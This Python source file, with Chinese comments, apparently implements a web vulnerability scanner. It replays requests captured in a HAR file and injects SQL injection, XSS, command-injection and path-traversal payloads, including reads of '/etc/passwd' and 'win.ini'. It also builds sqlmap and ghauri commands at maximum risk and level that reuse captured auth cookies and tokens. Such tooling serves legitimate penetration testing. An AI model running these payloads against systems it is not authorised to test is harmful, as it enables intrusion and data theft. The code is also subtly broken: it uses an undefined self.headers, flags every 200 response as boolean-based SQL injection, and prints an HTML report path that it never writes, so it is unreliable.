import argparse
import json
import requests
import time
import logging
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
import concurrent.futures
import sys
import urllib3
from typing import Dict, List, Any
import subprocess
from tqdm import tqdm
import colorama
from colorama import Fore, Style

# 初始化colorama
colorama.init()

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebVulnScanner:
    def __init__(self, har_file: str, proxy: str = None):
        self.proxy = proxy  # 通过参数传入代理地址
        self.setup_output_dir()
        self.setup_logging()
        self.har_data = self.load_har_file(har_file)
        self.setup_session()
        
        # SQL注入测试向量
        self.sql_payloads = {
            'error_based': [
                "'", '"', "') OR '1'='1", "1' OR '1'='1", 
                "' OR '1'='1'--", '" OR "1"="1"--', "' OR 1=1--",
                "') OR ('1'='1", "1)) OR ((1=1",
                "'||(SELECT version())||'",
                "'+UNION+SELECT+NULL--",
                "' UNION SELECT @@version--"
            ],
            'time_based': [
                "1' AND SLEEP(5)-- -", 
                "1' WAITFOR DELAY '0:0:5'-- -",
                "1' AND BENCHMARK(5000000,MD5(1))-- -",
                "') OR SLEEP(5)-- -",
                "';WAITFOR DELAY '0:0:5'--"
            ],
            'union_based': [
                "' UNION ALL SELECT NULL,NULL,NULL-- -",
                "' UNION SELECT @@version,NULL,NULL-- -",
                "' UNION ALL SELECT table_name,NULL FROM information_schema.tables-- -",
                "' UNION SELECT NULL,concat(table_name) FROM information_schema.tables-- -"
            ],
            'boolean_based': [
                "' AND 1=1-- -", 
                "' AND 1=2-- -",
                "' AND 'a'='a'-- -",
                "' AND 'a'='b'-- -",
                "') AND ('x'='x"
            ]
        }
        
        # XSS测试向量
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            '<svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<img src=1 onerror=alert(1)>',
            '<svg><script>alert(1)</script>',
            '">><script>alert(1)</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>'
        ]
        
        # 命令注入测试向量
        self.command_payloads = [
            '| whoami',
            '; whoami',
            '`whoami`',
            '$(whoami)',
            '%0awhoami',
            '| id',
            '; id;',
            '& id',
            '&& id',
            '| dir',
            '; dir',
            '& dir',
            '&& dir',
            '| type %SYSTEMROOT%\\win.ini',
            '; cat /etc/passwd',
            '| cat /etc/passwd'
        ]

        # 路径遍历测试向量
        self.path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',  # 使用双反斜杠
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
            '..%255c..%255c..%255cwindows%255cwin.ini',
            '..%5c..%5c..%5cwindows%5cwin.ini'
        ]

    def setup_output_dir(self):
        """设置输出目录"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.output_dir = f'vuln_scan_{timestamp}'
        os.makedirs(self.output_dir, exist_ok=True)

    def setup_logging(self):
        """配置日志记录"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        log_file = os.path.join(self.output_dir, 'scan.log')
        
        # 配置文件处理器
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(log_format))
        
        # 配置控制台处理器
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(log_format))
        
        # 配置logger
        self.logger = logging.getLogger('WebVulnScanner')
        self.logger.setLevel(logging.INFO)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def load_har_file(self, har_file: str) -> Dict[str, Any]:
        """加载HAR文件"""
        try:
            self.logger.info(f"Loading HAR file: {har_file}")
            with open(har_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Error loading HAR file: {str(e)}")
            sys.exit(1)

    def setup_session(self):
        """配置请求会话"""
        self.session = requests.Session()
        
        # 从 HAR 文件中提取请求头
        self.logger.info("Extracting headers from HAR file...")
        har_headers = {}
        try:
            for entry in self.har_data['log']['entries']:
                request_headers = {h['name']: h['value'] for h in entry['request']['headers']}
                # 将第一个请求的头信息用作全局默认头
                har_headers.update(request_headers)
                break  # 只提取第一个请求的头信息
        except KeyError as e:
            self.logger.error(f"Error extracting headers from HAR file: {str(e)}")
        
        if not har_headers:
            self.logger.warning("No headers found in HAR file. Using default headers.")
            har_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'close'
            }
        
        # 设置会话的头信息
        self.session.headers.update(har_headers)
        
        # 动态配置代理
        if self.proxy:
            self.logger.info(f"Using proxy: {self.proxy}")
            self.proxies = {'http': self.proxy}
            self.session.proxies = self.proxies
        else:
            self.logger.warning("No proxy specified. Requests will be made directly.")
            self.proxies = None

        # 禁用 SSL 验证
        self.session.verify = False

        self.logger.info("Session configured with headers from HAR file and proxy.")

    def make_request(self, url: str, method: str, params: Dict = None, 
                    data: Dict = None, headers: Dict = None, timeout: int = 10) -> requests.Response:
        """发送HTTP请求"""
        try:
            self.logger.debug(f"\nMaking request:")
            self.logger.debug(f"URL: {url}")
            self.logger.debug(f"Method: {method}")
            self.logger.debug(f"Parameters: {params}")
            self.logger.debug(f"Data: {data}")
            
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers or self.headers,
                proxies=self.proxies,
                verify=False,
                timeout=timeout,
                allow_redirects=False
            )
            
            self.logger.debug(f"Response status: {response.status_code}")
            self.logger.debug(f"Response length: {len(response.text)}")
            
            return response
            
        except requests.exceptions.ProxyError as e:
            self.logger.error(f"Proxy error: {str(e)}")
            return None
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Request error: {str(e)}")
            return None

    def extract_requests(self) -> List[Dict[str, Any]]:
        """从HAR文件提取请求信息"""
        requests_info = []
        
        for entry in self.har_data['log']['entries']:
            request = entry['request']
            
            req_info = {
                'url': request['url'],
                'method': request['method'],
                'headers': {h['name']: h['value'] for h in request['headers']},
                'params': {}
            }

            # 处理GET参数
            if request.get('queryString'):
                req_info['params'].update({
                    q['name']: q['value'] for q in request['queryString']
                })

            # 处理POST参数
            if request['method'] == 'POST' and 'postData' in request:
                post_data = request['postData']
                
                if 'params' in post_data:
                    req_info['post_data'] = {
                        p['name']: p['value'] for p in post_data['params']
                    }
                elif 'text' in post_data and 'application/json' in post_data.get('mimeType', ''):
                    try:
                        req_info['post_data'] = json.loads(post_data['text'])
                    except:
                        self.logger.error(f"Failed to parse JSON data for {request['url']}")
                        
            requests_info.append(req_info)
            
        return requests_info

    def test_vulnerability(self, request_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """测试漏洞"""
        vulnerabilities = []
        url = request_info['url']
        method = request_info['method']
        headers = request_info['headers']

        self.logger.info(f"\nTesting vulnerabilities for: {url}")

        # 测试GET参数
        if request_info['params']:
            self.logger.info("Testing GET parameters...")
            for param, value in request_info['params'].items():
                vulnerabilities.extend(self.test_parameter(url, method, param, value, headers))

        # 测试POST参数
        if method == 'POST' and 'post_data' in request_info:
            self.logger.info("Testing POST parameters...")
            for param, value in request_info['post_data'].items():
                vulnerabilities.extend(self.test_parameter(url, method, param, value, headers, True))

        return vulnerabilities

    def test_parameter(self, url: str, method: str, param: str, value: str, 
                      headers: Dict, is_post: bool = False) -> List[Dict[str, Any]]:
        """测试单个参数的所有漏洞类型"""
        vulnerabilities = []
        
        # SQL注入测试
        sql_results = self.test_sql_injection(url, method, param, value, headers, is_post)
        vulnerabilities.extend(sql_results)
        
        # XSS测试
        xss_results = self.test_xss(url, method, param, value, headers, is_post)
        vulnerabilities.extend(xss_results)
        
        # 命令注入测试
        cmd_results = self.test_command_injection(url, method, param, value, headers, is_post)
        vulnerabilities.extend(cmd_results)
        
        # 路径遍历测试
        path_results = self.test_path_traversal(url, method, param, value, headers, is_post)
        vulnerabilities.extend(path_results)
        
        return vulnerabilities

    def test_sql_injection(self, url: str, method: str, param: str, value: str, 
                          headers: Dict, is_post: bool = False) -> List[Dict[str, Any]]:
        """测试SQL注入漏洞"""
        results = []
        
        for injection_type, payloads in self.sql_payloads.items():
            for payload in tqdm(payloads, desc=f"Testing {injection_type} SQL injection"):
                test_value = f"{value}{payload}"
                
                try:
                    if is_post:
                        data = {param: test_value}
                        response = self.make_request(url, method, data=data, headers=headers)
                    else:
                        params = {param: test_value}
                        response = self.make_request(url, method, params=params, headers=headers)

                    if response and self.check_sql_vulnerability(response, injection_type):
                        results.append({
                            'type': 'SQL Injection',
                            'subtype': injection_type,
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'evidence': self.get_vulnerability_evidence(response)
                        })
                        self.logger.warning(f"{Fore.RED}Found SQL injection vulnerability!{Style.RESET_ALL}")
                        
                except Exception as e:
                    self.logger.error(f"Error testing SQL injection: {str(e)}")
                    
                time.sleep(0.5)  # 请求延迟
                
        return results

    def test_xss(self, url: str, method: str, param: str, value: str, 
                 headers: Dict, is_post: bool = False) -> List[Dict[str, Any]]:
        """测试XSS漏洞"""
        results = []
        
        for payload in tqdm(self.xss_payloads, desc="Testing XSS"):
            test_value = f"{value}{payload}"
            
            try:
                if is_post:
                    data = {param: test_value}
                    response = self.make_request(url, method, data=data, headers=headers)
                else:
                    params = {param: test_value}
                    response = self.make_request(url, method, params=params, headers=headers)

                if response and self.check_xss_vulnerability(response, payload):
                    results.append({
                        'type': 'XSS',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': payload,
                        'evidence': self.get_vulnerability_evidence(response)
                    })
                    self.logger.warning(f"{Fore.RED}Found XSS vulnerability!{Style.RESET_ALL}")
                    
            except Exception as e:
                self.logger.error(f"Error testing XSS: {str(e)}")
                
            time.sleep(0.5)
            
        return results

    def test_command_injection(self, url: str, method: str, param: str, value: str, 
                             headers: Dict, is_post: bool = False) -> List[Dict[str, Any]]:
        """测试命令注入漏洞"""
        results = []
        
        for payload in tqdm(self.command_payloads, desc="Testing Command Injection"):
            test_value = f"{value}{payload}"
            
            try:
                if is_post:
                    data = {param: test_value}
                    response = self.make_request(url, method, data=data, headers=headers)
                else:
                    params = {param: test_value}
                    response = self.make_request(url, method, params=params, headers=headers)

                if response and self.check_command_vulnerability(response):
                    results.append({
                        'type': 'Command Injection',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': payload,
                        'evidence': self.get_vulnerability_evidence(response)
                    })
                    self.logger.warning(f"{Fore.RED}Found Command Injection vulnerability!{Style.RESET_ALL}")
                    
            except Exception as e:
                self.logger.error(f"Error testing command injection: {str(e)}")
                
            time.sleep(0.5)
            
        return results

    def test_path_traversal(self, url: str, method: str, param: str, value: str,
                           headers: Dict, is_post: bool = False) -> List[Dict[str, Any]]:
        """测试路径遍历漏洞"""
        results = []
        
        for payload in tqdm(self.path_traversal_payloads, desc="Testing Path Traversal"):
            test_value = f"{value}{payload}"
            
            try:
                if is_post:
                    data = {param: test_value}
                    response = self.make_request(url, method, data=data, headers=headers)
                else:
                    params = {param: test_value}
                    response = self.make_request(url, method, params=params, headers=headers)

                if response and self.check_path_traversal_vulnerability(response):
                    results.append({
                        'type': 'Path Traversal',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': payload,
                        'evidence': self.get_vulnerability_evidence(response)
                    })
                    self.logger.warning(f"{Fore.RED}Found Path Traversal vulnerability!{Style.RESET_ALL}")
                    
            except Exception as e:
                self.logger.error(f"Error testing path traversal: {str(e)}")
                
            time.sleep(0.5)
            
        return results

    def check_sql_vulnerability(self, response: requests.Response, injection_type: str) -> bool:
        """检查SQL注入漏洞"""
        if not response:
            return False
            
        sql_errors = [
            'mysql_fetch_array()', 'mysql_num_rows()', 'mysql error',
            'sql syntax', 'MariaDB', 'ORA-', 'PostgreSQL', 'SQLite',
            'SQL syntax.*MySQL', 'Warning.*mysql_.*', 'valid MySQL result',
            r'MySqlClient\.',  # 使用原始字符串
            r'com\.mysql\.jdbc\.exceptions',
            'PostgreSQL.*ERROR', 
            r'Warning.*\Wpg_.*',  # 使用原始字符串
            'valid PostgreSQL result',
            r'Npgsql\.',  # 使用原始字符串
            'PG::SyntaxError:', 
            r'org\.postgresql\.util\.PSQLException',
            'ORA-[0-9][0-9][0-9][0-9]', 'Oracle error', 'Oracle.*Driver',
            r'Warning.*\Woci_.*',  # 使用原始字符串
            'Microsoft Access Driver', 'JET Database Engine',
            'Access Database Engine', 'ODBC Microsoft Access', 'Syntax error'
        ]
        
        response_text = response.text.lower()
        
        if injection_type == 'error_based':
            for error in sql_errors:
                if error.lower() in response_text:
                    self.logger.info(f"Found SQL error: {error}")
                    return True
                    
        elif injection_type == 'time_based':
            response_time = response.elapsed.total_seconds()
            self.logger.debug(f"Response time: {response_time}s")
            return response_time > 5
            
        elif injection_type == 'boolean_based':
            return len(response_text) > 0 and response.status_code == 200
            
        return False

    def check_xss_vulnerability(self, response: requests.Response, payload: str) -> bool:
        """检查XSS漏洞"""
        if not response:
            return False
            
        return payload.lower() in response.text.lower()

    def check_command_vulnerability(self, response: requests.Response) -> bool:
        """检查命令注入漏洞"""
        if not response:
            return False
            
        command_outputs = [
            'uid=', 'gid=', 'groups=',
            'Program Files', 'WINDOWS\\system32',
            '/etc/passwd', '/etc/shadow',
            'root:', 'Administrator',
            'system32', 'windows\\system32',
            '/bin/bash', '/usr/bin/',
            'C:\\Windows\\', 'C:\\Program Files\\'
        ]
        
        return any(output in response.text for output in command_outputs)

    def check_path_traversal_vulnerability(self, response: requests.Response) -> bool:
        """检查路径遍历漏洞"""
        if not response:
            return False
            
        sensitive_files = [
            '[root:', 'root:', 'mysql:', 'ftp:', 'nobody:',  # Unix passwd file
            '[boot loader]', '[fonts]', 'MPEGVideo',  # Windows ini file
            'root:x:', 'nobody:x:', 'daemon:x:', 'ftp:x:',  # Linux passwd file
            'Administrator:', 'Guest:', 'SYSTEM:',  # Windows user info
            '<?php', '<?=', '<%', '<%=',  # Source code indicators
            '#!/bin/bash', '#!/usr/bin/perl', '#!/usr/bin/python'  # Script headers
        ]
        
        return any(pattern in response.text for pattern in sensitive_files)

    def get_vulnerability_evidence(self, response: requests.Response) -> str:
        """获取漏洞证据"""
        evidence = f"Status Code: {response.status_code}\n"
        evidence += f"Response Length: {len(response.text)}\n"
        evidence += f"Response Time: {response.elapsed.total_seconds()}s\n\n"
        
        # 添加响应头信息
        evidence += "Response Headers:\n"
        for header, value in response.headers.items():
            evidence += f"{header}: {value}\n"
        
        # 添加响应内容片段
        evidence += "\nResponse Preview:\n"
        preview = response.text[:500] + "..." if len(response.text) > 500 else response.text
        evidence += preview
        
        return evidence

    def generate_report(self, vulnerabilities: List[Dict[str, Any]]):
        """生成漏洞报告(TXT格式)"""
        report_file = os.path.join(self.output_dir, 'vulnerability_report.txt')
        
        with open(report_file, 'w', encoding='utf-8') as f:
            # 写入扫描信息头部
            f.write('Web Vulnerability Scan Report\n')
            f.write('=' * 80 + '\n')
            f.write(f'Scan Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Total Vulnerabilities: {len(vulnerabilities)}\n')
            f.write('=' * 80 + '\n\n')

            # 漏洞类型统计
            vuln_types = {}
            for vuln in vulnerabilities:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
            f.write('Vulnerability Statistics:\n')
            for vuln_type, count in vuln_types.items():
                f.write(f'- {vuln_type}: {count}\n')
            f.write('\n' + '=' * 80 + '\n\n')

            # 详细漏洞信息
            f.write('Detailed Vulnerability Findings:\n\n')
            for i, vuln in enumerate(vulnerabilities, 1):
                # 每个漏洞一行，包含所有重要信息
                f.write(f'{i}. Type: {vuln["type"]} | URL: {vuln["url"]} | Method: {vuln["method"]} | '
                    f'Parameter: {vuln["parameter"]} | Payload: {vuln["payload"]}\n')
                
                # 如果有子类型，添加子类型信息
                if 'subtype' in vuln:
                    f.write(f'   Subtype: {vuln["subtype"]}\n')
                
                # 验证命令（SQLMap和Ghauri）
                sqlmap_cmd = self.generate_sqlmap_command(vuln)
                ghauri_cmd = self.generate_ghauri_command(vuln)
                f.write(f'   SQLMap: {sqlmap_cmd}\n')
                f.write(f'   Ghauri: {ghauri_cmd}\n')
                
                # 添加证据和分隔线
                f.write(f'   Evidence: {vuln["evidence"]}\n')
                f.write('-' * 80 + '\n')

        self.logger.info(f"Report generated: {report_file}")

    def get_recommendation(self, vuln_type: str) -> str:
                """获取漏洞修复建议"""
                recommendations = {
                    'SQL Injection': '''
            推荐修复方案：
            1. 使用参数化查询或预编译语句
            2. 实施严格的输入验证和过滤
            3. 使用ORM框架
            4. 限制数据库账户权限
            5. 禁用错误信息详细输出
            6. 使用安全的API''',

                    'XSS': '''
            推荐修复方案：
            1. 对输入数据进行验证和过滤
            2. 对输出进行编码
            3. 实施内容安全策略(CSP)
            4. 使用现代框架的XSS保护功能
            5. 在服务器端和客户端都进行输入验证
            6. 使用HTTPOnly标志保护cookies''',

                    'Command Injection': '''
            推荐修复方案：
            1. 避免直接执行系统命令
            2. 使用参数化API替代命令执行
            3. 实施严格的输入验证和过滤
            4. 使用白名单验证允许的命令
            5. 以最小权限运行应用
            6. 禁用危险函数''',

                    'Path Traversal': '''
            推荐修复方案：
            1. 规范化文件路径
            2. 验证文件访问权限
            3. 使用安全的API处理文件
            4. 实施访问控制
            5. 限制文件操作目录
            6. 使用白名单验证允许的文件类型''',

                    'CSRF': '''
            推荐修复方案：
            1. 实施CSRF令牌
            2. 验证来源请求头
            3. 使用SameSite Cookie
            4. 实施二次验证
            5. 避免使用GET请求修改数据
            6. 使用现代框架的CSRF保护''',

                    'Directory Listing': '''
            推荐修复方案：
            1. 禁用目录浏览
            2. 配置合适的访问控制
            3. 使用web.config或.htaccess限制访问
            4. 移除不必要的文件
            5. 实施适当的用户认证
            6. 定期安全审计''',

                    'Information Disclosure': '''
            推荐修复方案：
            1. 移除敏感信息
            2. 配置适当的错误处理
            3. 禁用详细错误消息
            4. 实施访问控制
            5. 加密敏感数据
            6. 定期进行安全审查''',

                    'Server Security Misconfiguration': '''
            推荐修复方案：
            1. 更新系统和组件
            2. 移除默认配置
            3. 禁用不必要的功能
            4. 实施安全标头
            5. 定期安全检查
            6. 使用安全配置指南''',

                    'Insecure Direct Object Reference': '''
            推荐修复方案：
            1. 实施访问控制检查
            2. 使用间接引用
            3. 验证用户权限
            4. 使用会话管理
            5. 记录访问日志
            6. 实施输入验证'''
                }

                # 返回对应漏洞类型的建议，如果没有则返回通用建议
                return recommendations.get(vuln_type, '''
            通用安全建议：
            1. 实施输入验证
            2. 实施访问控制
            3. 使用安全的配置
            4. 保持系统更新
            5. 进行安全审计
            6. 实施日志记录和监控
            ''')
    
    def generate_sqlmap_command(self, vuln_info: Dict[str, Any]) -> str:
        """生成SQLMap扫描命令"""
        url = vuln_info['url']
        parameter = vuln_info['parameter']
        method = vuln_info.get('method', 'GET')
        
        sqlmap_options = [
            f'sqlmap -u "{url}"',               # 目标URL
            f'-p {parameter}',                   # 测试参数
            '--batch',                           # 自动模式
            '--random-agent',                    # 随机User-Agent
            '--risk=3',                          # 风险等级(1-3)
            '--level=5',                         # 测试等级(1-5)
            '--threads=10',                      # 线程数
            '--time-sec=10',                     # 延时秒数
            '--timeout=30',                      # 超时时间
            '--dbms=MySQL',                      # 指定数据库类型
            '--proxy=http://127.0.0.1:10809',    # 代理设置
        ]
        
        # 如果是POST请求，添加相关参数
        if method == 'POST':
            sqlmap_options.extend([
                '--method=POST',
                '--data="' + urlencode(vuln_info.get('post_data', {})) + '"'
            ])
        
        # 根据漏洞类型添加特定选项
        if 'subtype' in vuln_info:
            if vuln_info['subtype'] == 'time_based':
                sqlmap_options.extend([
                    '--technique=T',           # 只使用基于时间的技术
                    '--time-sec=10'           # 设置时间延迟
                ])
            elif vuln_info['subtype'] == 'error_based':
                sqlmap_options.extend([
                    '--technique=E',           # 只使用基于错误的技术
                ])
            elif vuln_info['subtype'] == 'union_based':
                sqlmap_options.extend([
                    '--technique=U',           # 只使用UNION查询技术
                    '--union-cols=10'         # 设置UNION查询列数
                ])
        
        # 添加认证头
        sqlmap_options.append('--headers="' + 
            'Authorization: Bearer ' + self.headers.get('Authorization', '') + '\n' +
            'Cookie: ' + self.headers.get('Cookie', '') + '\n' +
            'Referer: ' + self.headers.get('Referer', '') + '"'
        )
        
        return ' \\\n    '.join(sqlmap_options)  # 使用换行使命令更易读

    def generate_ghauri_command(self, vuln_info: Dict[str, Any]) -> str:
        """生成Ghauri扫描命令"""
        url = vuln_info['url']
        parameter = vuln_info['parameter']
        method = vuln_info.get('method', 'GET')
        
        ghauri_options = [
            f'ghauri -u "{url}"',              # 目标URL
            f'-p {parameter}',                  # 测试参数
            '--threads=10',                     # 线程数
            '--level=5',                        # 测试等级
            '--delay=1',                        # 请求延迟
            '--timeout=30',                     # 超时设置
            '--proxy=http://127.0.0.1:8080'    # 代理设置
        ]
        
        # 如果是POST请求，添加相关参数
        if method == 'POST':
            ghauri_options.extend([
                '--method=POST',
                '--data="' + urlencode(vuln_info.get('post_data', {})) + '"'
            ])
        
        # 根据漏洞类型添加特定选项
        if 'subtype' in vuln_info:
            if vuln_info['subtype'] == 'time_based':
                ghauri_options.extend([
                    '--time-sec=10',
                    '--technique=TIME'
                ])
            elif vuln_info['subtype'] == 'error_based':
                ghauri_options.extend([
                    '--technique=ERROR'
                ])
            elif vuln_info['subtype'] == 'union_based':
                ghauri_options.extend([
                    '--technique=UNION',
                    '--union-cols=10'
                ])
        
        # 添加认证头
        ghauri_options.append('--headers="' + 
            'Authorization: Bearer ' + self.headers.get('Authorization', '') + '\n' +
            'Cookie: ' + self.headers.get('Cookie', '') + '\n' +
            'Referer: ' + self.headers.get('Referer', '') + '"'
        )
        
        return ' \\\n    '.join(ghauri_options)  # 使用换行使命令更易读

    def save_commands(self, vuln_info: Dict[str, Any]):
        """保存扫描命令到文件"""
        commands_file = os.path.join(self.output_dir, 'scan_commands.txt')
        
        with open(commands_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"Vulnerability: {vuln_info['type']}\n")
            f.write(f"URL: {vuln_info['url']}\n")
            f.write(f"Parameter: {vuln_info['parameter']}\n")
            if 'subtype' in vuln_info:
                f.write(f"Subtype: {vuln_info['subtype']}\n")
            
            f.write("\nSQLMap Command:\n")
            f.write(self.generate_sqlmap_command(vuln_info) + "\n")
            
            f.write("\nGhauri Command:\n")
            f.write(self.generate_ghauri_command(vuln_info) + "\n")

    def get_vulnerability_severity(self, vuln_type: str) -> str:
        """获取漏洞严重程度"""
        severity_map = {
            'SQL Injection': 'high',
            'Command Injection': 'high',
            'XSS': 'medium',
            'Path Traversal': 'medium'
        }
        return severity_map.get(vuln_type, 'low')

    def run_scan(self):
        """运行扫描"""
        self.logger.info(f"{Fore.GREEN}Starting vulnerability scan...{Style.RESET_ALL}")
        
        # 测试代理连接
        if not self.test_proxy_connection():
            self.logger.error(f"{Fore.RED}Failed to connect to proxy. Please check Burp Suite setup.{Style.RESET_ALL}")
            return
        
        # 提取请求信息
        requests_info = self.extract_requests()
        self.logger.info(f"Extracted {len(requests_info)} requests from HAR file")
        
        # 显示扫描进度
        total_requests = len(requests_info)
        successful_scans = failed_scans = 0
        all_vulnerabilities = []
        
        # 创建扫描命令文件头部
        commands_file = os.path.join(self.output_dir, 'scan_commands.txt')
        with open(commands_file, 'w', encoding='utf-8') as f:
            f.write("Web Vulnerability Scanner - Scan Commands\n")
            f.write("="*80 + "\n")
            f.write(f"Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n\n")
        
        # 使用tqdm创建进度条
        for i, req_info in enumerate(tqdm(requests_info, desc="Scanning requests"), 1):
            self.logger.info(f"\nScanning request {i}/{total_requests}")
            self.logger.info(f"URL: {req_info['url']}")
            
            try:
                vulnerabilities = self.test_vulnerability(req_info)
                if vulnerabilities:
                    all_vulnerabilities.extend(vulnerabilities)
                    self.logger.warning(
                        f"{Fore.YELLOW}Found {len(vulnerabilities)} vulnerabilities in request #{i}{Style.RESET_ALL}"
                    )
                successful_scans += 1
                    
            except Exception as e:
                self.logger.error(f"Error scanning {req_info['url']}: {str(e)}")
                failed_scans += 1
                continue
                
        # 生成最终报告
        if all_vulnerabilities:
            self.logger.warning(
                f"\n{Fore.RED}Found {len(all_vulnerabilities)} total vulnerabilities!{Style.RESET_ALL}"
            )
            self.generate_report(all_vulnerabilities)
            # 将此行删除，因为我们已经在发现漏洞时保存了命令
            # self.save_tool_commands(all_vulnerabilities)  
        else:
            self.logger.info(f"\n{Fore.GREEN}No vulnerabilities found.{Style.RESET_ALL}")
        
        # 打印最终统计
        self.print_final_statistics(total_requests, successful_scans, failed_scans, all_vulnerabilities)

    def test_proxy_connection(self) -> bool:
        """测试代理连接"""
        try:
            self.logger.info("Testing proxy connection...")
            test_url = "http://httpbin.org/ip"
            
            response = self.session.get(
                test_url, 
                proxies=self.proxies,
                verify=False,
                timeout=5
            )
            
            if response.status_code == 200:
                self.logger.info(f"{Fore.GREEN}✓ Proxy connection successful{Style.RESET_ALL}")
                self.logger.debug(f"Proxy response: {response.text}")
                return True
                
            self.logger.error(
                f"{Fore.RED}✗ Proxy test failed - Status code: {response.status_code}{Style.RESET_ALL}"
            )
            return False
            
        except requests.exceptions.ProxyError as e:
            self.logger.error(
                f"{Fore.RED}✗ Proxy connection error: {str(e)}\n"
                f"Please check if Burp Suite is running and listening on port 8080{Style.RESET_ALL}"
            )
            return False
        except Exception as e:
            self.logger.error(f"{Fore.RED}✗ Proxy test error: {str(e)}{Style.RESET_ALL}")
            return False

    def print_final_statistics(self, total_requests: int, successful_scans: int, 
                             failed_scans: int, vulnerabilities: List[Dict[str, Any]]):
        """打印最终统计信息"""
        print("\n" + "="*50)
        print(f"{Fore.CYAN}Scan Completed - Final Statistics{Style.RESET_ALL}")
        print("="*50)
        
        # 请求统计
        print(f"\n{Fore.BLUE}Request Statistics:{Style.RESET_ALL}")
        print(f"Total Requests: {total_requests}")
        print(f"Successful Scans: {successful_scans}")
        print(f"Failed Scans: {failed_scans}")
        print(f"Success Rate: {(successful_scans/total_requests*100):.1f}%")
        
        # 漏洞统计
        print(f"\n{Fore.BLUE}Vulnerability Statistics:{Style.RESET_ALL}")
        vuln_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
        for vuln_type, count in vuln_types.items():
            severity = self.get_vulnerability_severity(vuln_type)
            color = {
                'high': Fore.RED,
                'medium': Fore.YELLOW,
                'low': Fore.GREEN
            }.get(severity, Fore.WHITE)
            print(f"{color}{vuln_type}: {count} ({severity.upper()}){Style.RESET_ALL}")
            
        # 输出路径
        print(f"\n{Fore.BLUE}Output Location:{Style.RESET_ALL}")
        print(f"Report Directory: {self.output_dir}")
        print(f"Full Report: {os.path.join(self.output_dir, 'vulnerability_report.html')}")
        print(f"Log File: {os.path.join(self.output_dir, 'scan.log')}")
        
        print("\n" + "="*50)

def main():
    """主函数"""
    # 初始化colorama
    colorama.init()
    
    print(f"{Fore.CYAN}Web Vulnerability Scanner{Style.RESET_ALL}")
    print("="*50)
    
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    parser.add_argument("har_file", help="Path to the HAR file for scanning.")
    parser.add_argument("--proxy", help="Proxy address to use for scanning (e.g., http://127.0.0.1:8080).", default=None)
    args = parser.parse_args()
    
    har_file = args.har_file
    proxy = args.proxy
    if not os.path.exists(har_file):
        print(f"{Fore.RED}Error: HAR file '{har_file}' not found{Style.RESET_ALL}")
        sys.exit(1)
    
    try:
        scanner = WebVulnScanner(har_file, proxy)
        scanner.run_scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error during scan: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
    finally:
        colorama.deinit()

if __name__ == "__main__":
    main()